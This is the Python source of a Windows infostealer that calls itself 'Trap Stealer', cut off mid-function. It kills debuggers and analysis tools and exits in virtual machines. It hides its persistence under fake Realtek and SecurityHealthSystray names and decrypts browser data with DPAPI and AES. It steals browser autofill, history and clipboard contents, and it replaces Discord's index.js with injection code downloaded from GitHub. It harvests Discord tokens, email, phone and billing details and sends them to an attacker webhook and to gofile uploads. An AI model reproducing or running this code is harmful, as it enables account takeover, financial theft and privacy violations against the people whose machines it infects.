import sys, time, random, threading, ctypes, shutil
import os, re, socket, json, sqlite3, zipfile, subprocess
import urllib.request, winreg, base64, getpass, platform
from os.path import isfile, exists
from ctypes import wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from json import loads, dumps
from zipfile import ZipFile
from shutil import copy
from sys import executable
from ctypes import windll
from urllib.request import Request, urlopen
from sqlite3 import connect as sql_connect
from base64 import b64decode
from json import loads as json_loads, load
from os import getenv, startfile
from os.path import isfile
import winreg, random
from base64 import b64decode
import os.path, zipfile
import shutil, json, sqlite3
import tempfile, datetime
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from ctypes import *
webhook = '%Webhook%' 

FakeWebhook = '%FakeWebhook%'
Fakegen = '%FakeGen%' 
injection = '%Injection%' 
Startup = '%Startup%'
antidebugging = '%No_Debug%' 
DiscordStop = '%Close%' 

if Startup == False:
    StartupMessage = 'Adding to startup disabled in the config'
else:
    StartupMessage = 'Error while adding Trap into the startup folder' 

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
]

for modl in requirements:
    try:
        __import__(modl[0])
    except ImportError:
        subprocess.call(['pip', 'install', modl[1]])

from Crypto.Cipher import AES
import requests


def clear_command_prompt():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def antidebug():
    checks = [check_windows, check_ip, check_registry, check_dll]
    for check in checks:
        t = threading.Thread(target=check, daemon=True)
        t.start()
coonum = 0
def exit_program(reason):
    print(reason)
    ctypes.windll.kernel32.ExitProcess(0)

PasswCount = 0
def check_windows():
    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    def winEnumHandler(hwnd, ctx):
        title = ctypes.create_string_buffer(1024)
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        if title.value.decode('Windows-1252').lower() in {'proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'titanHide', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'X64NetDumper', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'scyllaHide', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'http toolkit'}:
            pid = ctypes.c_ulong(0)
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value != 0:
                try:
                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
                    ctypes.windll.kernel32.CloseHandle(handle)
                except:
                    pass
            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
        return True

    while True:
        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
        time.sleep(0.5)
        
def check_ip():
    blacklisted = [
        '822.842.352.43', '311.45.741.48', '64.842.821.32', '441.291.112.29', '432.75.04.291',
        '3.15.932.591', '72.0.501.43', '071.352.58.43', '302.622.231.88', '701.39.291.53',
        '022.47.241.43', '47.011.112.291', '341.19.501.881', '42.18.52.59', '19.451.47.901',
        '151.722.911.212', '142.27.501.43', '902.57.612.39', '061.901.112.29', '761.722.911.212',
        '031.64.38.43', '09.451.47.901', '05.8.931.87', '21.26.741.48', '79.0.112.08',
        '611.19.501.881', '961.371.541.901', '54.411.821.391', '32.69.831.43', '21.74.732.53',
        '142.342.58.43', '95.15.932.591', '05.241.33.312', '001.522.231.88', '83.21.81.401',
        '722.96.922.53', '991.55.112.29', '102.391.522.391', '312.05.661.78', '09.402.52.59',
        '411.641.141.43', '471.98.541.43', '31.6.991.53', '52.542.141.43', '301.82.78.291',
        '222.67.47.591', '86.381.501.43', '17.132.231.88', '07.561.932.871', '85.591.541.43',
        '961.991.351.88', '29.451.47.901', '061.87.451.491', '501.571.181.591', '261.21.421.46',
        '371.19.501.881', '371.061.99.02', '26.25.112.29', '33.902.401.97', '832.722.231.88'
    ]
    while True:
        try:
            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
            if ip[::-1] in blacklisted:
                exit_program('')
            return
        except:
            pass
        
def check_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
        subkey_count = winreg.QueryInfoKey(key)[0]
        for i in range(subkey_count):
            subkey = winreg.EnumKey(key, i)
            if subkey.startswith('VMWARE'):
                exit_program('')
        winreg.CloseKey(key)
    except:
        pass

def check_dll():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        exit_program('')




class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]
def webhook_tools():
    try:
        time.sleep(1)
        clear_command_prompt()
        inputmain = input(f'''
        Which webhook tools you want to use ?

        [1] Webhook Spammer
        [2] Webhook Deleter

        -> ''')
        if inputmain == '1':
            url = input(f'Webhook URL : ')
            messages = (f'Message To Spam : ')
            rah = "dens"
            timetospam = input(f'How many times do you want to {rah[::-1]} the message? : ')
            message = messages
            data = {
                "content": message,
                "username": "Spam Moment"
            }

            for i in range(int(timetospam)):
                encoded_data = urllib.parse.urlencode(data).encode('utf-8')
                req = urllib.request.Request(url, data=encoded_data)
                try:
                    with urllib.request.urlopen(req) as response:
                        pass
                except urllib.error.HTTPError as e:
                    print(f"Error: {e.code}")
                else:
                    print(f"Message sent successfully")
                time.sleep(0.2)

            print(f'Ended. Press Any Key to Leave')

        elif inputmain == '2':
            webhook = input(f'Webhook URL -> ')
            req = urllib.request.Request(webhook, method='DELETE')
            try:
                with urllib.request.urlopen(req) as response:
                    pass
            except urllib.error.HTTPError as e:
                print(f"Error: {e.code}")
            else:
                print(f"Webhook deleted successfully")
            print(f'Press any key to quit')

        else:
            print(f'Wrong input')
            time.sleep(1)
    except:
        pass
headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}

file_path = os.path.realpath(__file__)
USER_NAME = getpass.getuser()


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', c_ulong),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = create_string_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)


wltZip = []
GamingZip = []
OtherZip = []
def fakegen():
    try:
        time.sleep(1)
        clear_command_prompt()
        print('''
        ███╗   ██╗██╗████████╗██████╗  ██████╗  ██████╗ ███████╗███╗   ██╗
        ████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗██╔════╝ ██╔════╝████╗  ██║
        ██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║██║  ███╗█████╗  ██╔██╗ ██║
        ██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║██║   ██║██╔══╝  ██║╚██╗██║
        ██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝╚██████╔╝███████╗██║ ╚████║
        ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝''')
        import string

        codes_list = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
        count_generator = 0
        valid_url = random.randint(1, 1000)
        valid_test = -1
        filename = input("Enter the filename to use for proxies (or press Enter to skip): ")
        while True:
            essay = input("How many codes do you want to generate? (Enter a number): ")
            if not essay.isdigit() or int(essay) < 1:
                print("Invalid input. Please enter a positive integer.")
                continue
            essay = int(essay)
            for i in range(essay):
                count_generator += 1
                codes = ''.join(random.choices(codes_list, k=16))
                url = "https://discord.gift/" + codes
                print(f"{count_generator}. {url} - NOT WORKING")
                if valid_test == valid_url:
                    print(f"\nCongratulations! You found a valid code:\n{url}\n")
                    time.sleep(3600)
                valid_test = random.randint(1, 100000)
                time.sleep(0.05)
    except:pass

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    


def Clipboard():
    try:
        command = 'Get-Clipboard -TextFormatType Text'
        result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, check=True)
        clipboard_data = result.stdout.strip()
        return clipboard_data
    except subprocess.CalledProcessError as e:
        return 'Error while getting clipboard'

import string
apppp = 'atadppa'
path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"

def get_random_path():
    possible_paths = [os.getenv("APPDATA"), os.getenv("LOCALAPPDATA")]
    chosen_path = random.choice(possible_paths)
    return chosen_path

def generate_random_filename():
    random_chars = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    file_extensions = ['.dll', '.png', '.jpg', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg', '.jpeg']
    return random_chars + random.choice(file_extensions)

def create_copy_and_return_new_path():
    current_script_path = sys.argv[0]
    
    new_filename = generate_random_filename()
    new_path = os.path.join(get_random_path(), new_filename)
    
    shutil.copy2(current_script_path, new_path)
    
    return new_path

def add_to_startup(new_path):
    faked = 'SecurityHealthSystray.exe'
    address = f"{sys.executable} {new_path}"
    key1 = winreg.HKEY_CURRENT_USER
    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    
    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")



def startup():
    global StartupMessage
    StartupMessage = 'Sucessfully added to startup'
    try:

        new_path = create_copy_and_return_new_path()
    
        try:
            add_to_startup(new_path)
        except Exception as e:
            pass
    except:pass
    apppp = 'atadppa'
    path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"

    if not isfile(path):
        copy(__file__, path)

    else:
        if __file__.replace('\\', '/') != path.replace('\\', '/'):
            pass



def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

Dscptb= 'BTPdrocsiD'[::-1]
Dsccana = 'yranaCdrocsiD'[::-1]
Dscdev = 'tnempoleveDdrocsiD'[::-1]
def NoDiscord():
    ind = "sj.xedni"
    folder_list = f['Discord', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
    for folder_name in folder_list:
        folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(folder_path):
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
                        file_path = os.path.join(root, file)
                        with open(file_path, "w+", encoding="utf-8") as f:
                            f.write('error')



def idisc():
    ind = "sj.xedni"


    inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"

    folder_list = f['Discord', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
    for folder_name in reversed(folder_list):
        folder_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(folder_path):
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    if file == f'{ind[::-1]}' and 'discord_desktop_core-' in root:
                        file_path = os.path.join(root, file)
                        inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", webhook)
                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write(inj_content)



pas = 'drowssaP'
def systemInfo():
    system = platform.system()
    node_name = platform.node()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    home_dir = os.path.expanduser("~")

    sys_info = f"System information:\n"\
               f"{system}\n"\
               f"Node name: {node_name}\n"\
               f"Release: {release}\n"\
               f"Version: {version}\n"\
               f"Machine: {machine}\n"\
               f"Processor: {processor}\n"\
               f"Home directory: {home_dir}\n"

    return sys_info

def avs():
    script = r'''
$filePath = "C:\Users\$env:username\AppData\Local\Temp\winvs.txt"
if (-not (Test-Path -Path $filePath)) {
    New-Item -Path $filePath -ItemType File
}
Clear-Content -Path $filePath
Powershell -command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName" >> $filePath
'''

    subprocess.run(["powershell", '-NoProfile', '-ExecutionPolicy', 'Bypass', script])
        
    username = os.getlogin()

    file_path = os.path.join('C:\\Users', username, 'AppData', 'Local', 'Temp', 'winvs.txt')

    with open(file_path, 'rb') as file:
        content = file.read().decode('utf-8', errors='ignore').strip()



def globalInfo():
    
    url = 'nosj/oi.ofnipi//:sptth'
    response = urllib.request.urlopen(url[::-1])
    data = json.loads(response.read().decode())
    ip = data['ip']
    loc = data['loc']
    location = loc.split(',')
    latitude = location[0]
    longitude = location[1]
    username = os.getlogin()
    country = data['country']
    country_code = data['country'].lower()
    region = data['region']
    city = data['city']
    postal = data['postal']
    computer_name = socket.gethostname()
    cores = os.cpu_count()
    avss = avs()
    if platform.system() == 'Linux':
        gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
        if gpu_info:
            gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
    elif platform.system() == 'Windows':
        try:
            gpu_model = os.popen("nvidia-smi --query-gpu=name --format=csv,noheader").read().strip()
            total_memory = os.popen("nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits").read().strip()
            free_memory = os.popen("nvidia-smi --query-gpu=memory.free --format=csv,noheader,nounits").read().strip()
            used_memory = os.popen("nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits").read().strip()
            temperature = os.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits").read().strip()

            gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`"

        except Exception as e:
            gpu = f"An error occurred: {str(e)}"

    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : {gpu} \nLatitude + Longitude  : `{latitude}, {longitude}`\n Installed antivirus :\n`{avss}` "
    if len(globalinfo) > 1750:
        globalinfo = globalinfo[:1708] + "\n**Can't show everything, too many data**"
        
    return globalinfo

# ALL PATH
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
home_dir = os.path.expanduser('~')
desktop_path = os.path.join(home_dir, 'Desktop')
downloads_path = os.path.join(home_dir, 'Downloads')
documents_path = os.path.join(home_dir, 'Documents')
pictures_path = os.path.join(home_dir, 'Pictures')


Threadlist = []

badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]

pub = 'cilbup'

Autofill = []
AutofillCount = 0


def getAutofill(path, arg):
    
    try:
        global Autofill, AutofillCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"


        shutil.copy2(pathC, tempfold)
        conn = sql_connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM autofill WHERE value NOT NULL")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        for row in data:
            if row[0] != '':
                Autofill.append(f"Name: {row[0]} | Value: {row[1]}")
                AutofillCount += 1
        writeforfile(Autofill, 'autofill')
    except Exception as e:
        print(e)


def get_uhq_guilds(token):
    try:
        uhq_guilds = []
        headers = {
            "Authorization": token,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        request = urllib.request.Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
        response = urllib.request.urlopen(request)
        guilds = json.loads(response.read().decode())

        for guild in guilds:
            if guild["approximate_member_count"] < 30 or not (guild["owner"] or guild["permissions"] == "4398046511103"):
                continue
            
            request = urllib.request.Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)
            response = urllib.request.urlopen(request)
            invites = json.loads(response.read().decode())

            invite_code = invites[0]['code'] if invites else None

            guild_info = f"⚔️ [{guild['name']}]({f'https://discord.gg/{invite_code}' if invite_code else ''}) `({guild['id']})` **{guild['approximate_member_count']} Members**"
            uhq_guilds.append(guild_info)

        if not uhq_guilds:
            return "`No HQ Guilds`"

        return '\n'.join(uhq_guilds)
    except Exception as e:
        return "`No HQ Guilds`"


def get_uhq_friends(tokq, max_friends=5):
    headers = {
        "Authorization": tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        response = urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers))
        friendlist = json.loads(response.read().decode())
    except:
        return False

    uhqlist = ''
    friend_count = 0 

    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
    return uhqlist if uhqlist != '' else "`No HQ Friends`"

def get_badge(flags):
    if flags == 0:
        return ''

    owned_badges = ''
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            owned_badges += badge["Emoji"]
            flags = flags % badge["Value"]
    return owned_badges


def get_tokq_info(tokq):
    headers = {
        "Authorization": tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    response = urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
    user_info = json.loads(response.read().decode())

    username = user_info["username"]
    globalusername = 'None'
    if "global_name" in user_info:
        globalusername = user_info["global_name"]
    bio = "None"
    if "bio" in user_info:
        bio = user_info["bio"]
        if len(bio) > 70:
            bio = bio[:67] + "..."
    nsfw = ""
    if "nsfw_allowed" in user_info:
        nsfw = user_info["nsfw_allowed"]
        if nsfw == "False":
            nsfw = "❌"
        else:
            nsfw = "✅"
            
    hashtag = user_info["discriminator"]
    emma = 'liame'
    ema = user_info.get(f"{emma[::-1]}", "")
    user_id = user_info["id"]
    pfp = user_info["avatar"]

    flags = user_info[f"{pub[::-1]}_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in user_info:
        nitros = user_info["premium_type"]
        if nitros == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitros == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "

    if "phone" in user_info:
        phone = f'`{user_info["phone"]}`'

    return username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitro, phone

def checkTokq(Tokq):
    headers = {
        "Authorization": Tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

def GetBilling(Tokq):
    headers = {
        "Authorization": Tokq,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        with urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)) as response:
            billing_json = loads(response.read().decode())
    except:
        return False
    
    if not billing_json:
        return " -"
    billing = ""
    for method in billing_json:
        if not method["invalid"]:
            if method["type"] == 1:
                billing += ":credit_card:"
            elif method["type"] == 2:
                billing += ":parking: "
    return billing



def uploadTokq(Tokq, path):
    username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitro, phone = get_tokq_info(Tokq)

    pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{pfp}" if pfp else "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"

    billing = GetBilling(Tokq)
    badge = get_badge(flags)
    friends = get_uhq_friends(Tokq)
    guild = get_uhq_guilds(Tokq)

    if friends == '': friends = "No Rare Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"
    tok = 'nekoT'
    em = 'liamE'
    data = {
        "username": "Trap Stealer",
        "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
        "content": "",
        "embeds": [
            {
                "title": f"🍪 Trap Stealer {tok[::-1]}",
                "description": f"`Path` : {path}\n",
                "color": 0xffb6c1,
                "author": {
                    "name": f"{username}#{hashtag} ({user_id})\nGlobal Username : {globalusername}",
                    "icon_url": pfp
                },
                "footer": {
                    "text": "Trap Stealer",
                    "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                },
                "thumbnail": {
                    "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                },
                "fields": [
                    {
                        "name": f"✨ {tok[::-1]}:",
                        "value": f"`{Tokq}`"
                    },
                    {
                        "name": ":mobile_phone: Phone:",
                        "value": phone,
                        "inline": True
                    },
                    {
                        "name": ":ribbon: Bio:",
                        "value": bio,
                        "inline": True
                    },
                    {
                        "name": "🔞 Nsfw Enabled:",
                        "value": nsfw,
                        "inline": True
                    },
                    {
                        "name": f":envelope: {em[::-1]}:",
                        "value": f"`{ema}`",
                        "inline": True
                    },
                    {
                        "name": ":beginner: Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": True
                    },
                    {
                        "name": ":credit_card: Billing:",
                        "value": billing,
                        "inline": True
                    },
                    {
                        "name": "🔮 HQ Friends:",
                        "value": friends,
                        "inline": False
                    },
                    {
                        "name": "⚔️ HQ guilds:",
                        "value": guild,
                        "inline": False
                    }
                    
                ]
            }
        ],
        "attachments": []
    }
    headers= {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    character_limit = 1900

    if len(data) > character_limit:
        data = data[:character_limit - 3] + "..."

    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)



def upload_file(file_path):
    try:
        response = requests.post(
            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
            files={'file': open(file_path, 'rb')}
        )
        return response.json()["data"]["downloadPage"]
    except:
        return False



def find_history_file(browser_name, path_template):
    if os.name == "nt":
        data_path = os.path.expanduser(path_template.format(browser_name))
    elif os.name == "posix":
        data_path = os.path.expanduser(path_template.format(browser_name))
    else:
        return None

    return data_path if os.path.exists(data_path) else None

def find_brave_history_file():
    return os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')
from urllib.parse import urlparse
cl = 0
CookiCount = 0
Cookies = []

def get_brave_history(temp_dir, files_to_zip):
    history_db = find_brave_history_file()

    try:
        conn = sqlite3.connect(history_db)
        cursor = conn.cursor()

        select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
        cursor.execute(select_statement)
        results = cursor.fetchall()

        def parse(url):
            try:
                parsed_url = urlparse(url)
                domain = parsed_url.netloc.replace("www.", "")
                return domain
            except Exception as e:
                pass

        sites_count = {}

        for url, count in results:
            url = parse(url)
            if url in sites_count:
                sites_count[url] += 1
            else:
                sites_count[url] = 1

        output_file = os.path.join(temp_dir, 'brave_search_history.txt')
        with open(output_file, 'w', encoding='utf-8') as file:
            for url, count in sites_count.items():
                file.write(f"URL: {url}, Visits: {count}\n")

        files_to_zip.append(output_file)

        cursor.close()
        conn.close()
    except sqlite3.Error as e:
        pass
        
def find_chrome_history_file():
    return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")

def find_chrome_history_file():
    return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")

def find_edge_history_file():
    return find_history_file("Microsoft\\Edge\\User Data\\Default\\History", "~\\AppData\\Local\\{}")

def find_operagx_history_file():
    return find_history_file("Opera Software\\Opera GX Stable\\History", "~\\AppData\\Roaming\\{}")

def find_firefox_history_file():
    if os.name == "nt":
        profile_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    elif os.name == "posix":
        profile_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
    else:
        return None

    profiles = [f for f in os.listdir(profile_path) if f.endswith('.default')]
    if not profiles:
        return None

    profile_path = os.path.join(profile_path, profiles[0])
    history_file_path = os.path.join(profile_path, "places.sqlite")

    return history_file_path if os.path.exists(history_file_path) else None

def find_opera_history_file():
    return find_history_file("Opera Software\\Opera Stable\\History", "~\\AppData\\Roaming\\{}")

def find_safari_history_file():
    if os.name == "nt":
        data_path = os.path.expanduser("~\\Apple\\Safari\\History.db")
    elif os.name == "posix":
        data_path = os.path.expanduser("~/Library/Safari/History.db")
    else:
        return None

    return data_path if os.path.exists(data_path) else None

def find_ie_history_file():
    if os.name == "nt":
        data_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat")
    else:
        return None

    return data_path if os.path.exists(data_path) else None

def find_safari_technology_preview_history_file():
    if os.name == "nt":
        data_path = os.path.expanduser("~\\Apple\\Safari Technology Preview\\History.db")
    elif os.name == "posix":
        data_path = os.path.expanduser("~/Library/SafariTechnologyPreview/History.db")
    else:
        return None

    return data_path if os.path.exists(data_path) else None

def save_search_history_to_file(history_file, output_file):
    if not history_file:
        return

    try:
        conn = sqlite3.connect(history_file)
        cursor = conn.cursor()
        cursor.execute("SELECT title, url, last_visit_time FROM urls WHERE url LIKE '%google.com/search?q=%' ORDER BY last_visit_time DESC")
        search_history = cursor.fetchall()

        if search_history:
            with open(output_file, 'w', encoding='utf-8') as file:
                for item in search_history:
                    title, url, last_visit_time = item
                    file.write(f"{title} - {url}\n")
        cursor.close()
        conn.close()
    except sqlite3.Error as e:
        if "unable to open database file" in str(e).lower() or "database is locked" in str(e).lower():
            pass

def is_process_running(process_name):
    try:
        output = subprocess.check_output(["tasklist", "/NH", "/FO", "CSV"], shell=True, universal_newlines=True)
